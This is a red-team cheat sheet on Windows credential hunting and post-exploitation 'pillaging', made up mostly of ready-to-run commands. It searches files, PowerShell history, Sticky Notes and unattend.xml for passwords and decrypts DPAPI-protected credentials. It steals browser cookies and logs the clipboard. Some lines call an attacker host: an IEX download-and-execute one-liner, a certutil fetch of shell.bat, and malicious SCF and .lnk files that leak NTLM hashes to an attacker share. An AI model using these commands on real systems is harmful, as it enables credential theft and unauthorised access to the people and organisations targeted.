---
layout: default
---
>> [cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

## Credential Theft

We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain

### Credential Hunting

#### **Application Configuration Files**

##### Searching for Files

```
PS C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
>> Sensitive IIS information such as credentials may be stored in a web.config file. For the default IIS website, this could be located at C:\inetpub\wwwroot\web.config, but there may be multiple versions of this file in different locations, which we can search for recursively

#### **Dictionary Files**

Sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline

```
PS C:\> gc 'C:\Users\abc\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

#### **Unattended Installation Files**

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded

```
Unattend.xml

<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

#### **PowerShell History File**

```
PS C:\> (Get-PSReadLineOption).HistorySavePath

PS C:\> gc (Get-PSReadLineOption).HistorySavePath
```
We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user

```
PS C:\> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### **PowerShell Credentials**

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using DPAPI, which typically means they can only be decrypted by the same user on the same computer they were created on.

##### Decrypting Powershell Credentials

```
PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $credential.GetNetworkCredential().username
PS C:\> $credential.GetNetworkCredential().password
```

##### Decrypting Secure String Pass
```
PS C:\> $pw = Get-Content .creds.txt | ConvertTo-SecureString
PS C:\> $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
PS C:\> $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
PS C:\> $UnsecurePassword
```
### Other Files

There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as .kdbx, .vmdk, .vdhx, .ppk, etc

#### **Manually Searching the File System for Credentials**

```
--- Example 1 ---

C:\> cd c:\Users\abc\Documents & findstr /SI /M "password" *.xml *.ini *.txt

--- Example 2 ---

C:\> findstr /si password *.xml *.ini *.txt *.config

--- Example 3 ---

C:\> findstr /spin "password" *.*
```

##### Search for File Extensions

```
C:\> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

C:\> where /R C:\ *.config

PS C:\> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

##### Search File Contents with PowerShell

```
PS C:\> select-string -Path C:\Users\abc\Documents\*.txt -Pattern password
```

#### **Sticky Notes Passwords**

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at **C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite** and is always worth searching for and examining

##### Looking for StickyNotes DB Files

```
PS C:\> ls
 
 
    Directory: C:\Users\abc\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

##### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite)

```
PS C:\> Set-ExecutionPolicy Bypass -Scope Process
PS C:\> cd .\PSSQLite\
PS C:\> Import-Module .\PSSQLite.psd1
PS C:\> $db = 'C:\Users\abc\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```
>> Strings Can also be used depending on the size of the database

#### **Other Files of Interest**

#### Other Interesting Files

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

## Additional Techniques

### Interacting with Users

#### **Process Command Lines**

##### Monitoring for Process Command Lines

There may be scheduled tasks or other processes being executed which pass credentials on the command line.The Script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
##### Running Monitor Script on Target Host

We can host the script on our attack machine and execute it on the target host as follows

```
PS C:\> IEX (iwr 'http://<ip>/procmon.ps1') 
```

#### **SCF on a File Share**

##### Malicious SCF File

let's create the following file and name it something like @Inventory.scf .  We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share

```
[Shell]
Command=2
IconFile=\\<ip>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
``` 

#### **Capturing Hashes with a Malicious .lnk File**

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell

```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
### Pillaging

Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details,passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

#### **Get Installed Programs via PowerShell & Registry Keys**

```
PS C:\> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

#### **Abusing Cookies to Get Access**

##### Copy Firefox Cookies Database

```
PS C:\> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

>> We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database

##### Cookie Extraction from Chromium-based Browsers

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer

[SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format

```
PS C:\> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
>> the cookie file path that contains the database is hardcoded in SharpChromium, and the current version of Chrome uses a different location

```
PS C:\> Invoke-SharpChromium -Command "cookies <site.com>"
```

#### **Clipboard**

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below

```
PS C:\> Invoke-ClipboardLogger
```
>> The script will start to monitor for entries in the clipboard and present them in the PowerShell session

>> User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging

### Miscellaneous Techniques

#### **LOLBAS**

The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft for example [certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)

##### Transferring File with Certutil

```
PS C:\> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

##### Encoding File with Certutil

```
C:\> certutil -encode file1 encodedfile
```

##### Decoding File with Certutil

```
C:\> certutil -decode encodedfile file2
```

#### **Always Install Elevated**

##### Enumerating Always Install Elevated Settings

```
PS C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
>> if key is set to 0x1 then always install elevated exist

#### **Scheduled Tasks**

##### Enumerating Scheduled Tasks

```
C:\>  schtasks /query /fo LIST /v
```

##### Enumerating Scheduled Tasks with PowerShell

```
PS C:\> Get-ScheduledTask | select TaskName,State
```
>> By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\Windows\System32\Tasks, which standard users do not have read access to

#### **User/Computer Description Field**

##### Checking Local User Description Field

```
PS C:\> Get-LocalUser
```

##### Enumerating Computer Description Field with Get-WmiObject Cmdlet

```
PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description
```


